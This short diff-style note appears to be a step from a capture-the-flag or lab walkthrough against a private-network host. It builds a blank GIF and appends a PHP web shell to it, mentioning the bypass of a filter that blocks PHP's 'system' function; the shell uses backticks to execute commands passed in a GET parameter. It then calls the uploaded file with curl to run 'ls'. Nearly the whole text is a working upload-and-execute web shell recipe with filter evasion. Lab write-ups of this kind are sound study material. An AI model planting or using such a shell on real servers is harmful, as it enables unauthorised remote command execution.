@@ -1,0 +1,5 @@
+convert -size 32x32 xc:white empty.gif
+-Bypassing CrappyWAF ( system php function detected)
+echo '<?php echo `id`; ?>' >> empty.gif
+echo '<?php $cmd=$_GET['cmd']; echo `$cmd`; ?>' >> empty.gif
+curl "http://192.168.130.199/imfadministrator/uploads/88a05ecd1b9e.gif?cmd=ls"
